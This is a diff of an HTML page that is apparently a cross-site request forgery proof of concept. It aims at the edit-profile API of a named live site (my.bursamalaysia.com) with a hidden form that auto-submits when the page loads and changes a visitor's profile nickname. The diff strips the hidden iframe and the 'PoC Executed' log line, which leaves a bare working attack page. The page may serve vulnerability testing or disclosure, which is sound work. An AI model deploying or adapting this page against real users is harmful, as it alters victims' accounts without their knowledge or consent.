@@ -60,19 +60,16 @@
         <p class="status">Target: https://my.bursamalaysia.com/api/v1/request/edit-profile</p>
     </div>
     
-    <form id="csrfForm" action="https://my.bursamalaysia.com/api/v1/request/edit-profile" method="POST" target="hidden_iframe">
+    <form id="csrfForm" action="https://my.bursamalaysia.com/api/v1/request/edit-profile" method="POST">
         <input type="hidden" name="nick_name" value="asdqwess">
     </form>
-
-    <iframe name="hidden_iframe" style="display:none;"></iframe>
 
     <script>
         // Automatically submit the form on page load
         window.onload = function() {
             setTimeout(function() {
                 document.getElementById('csrfForm').submit();
-                console.log("PoC Executed");
-            }, 1000); // Slight delay for visual effect
+            }, 1000);
         };
     </script>
 </body>
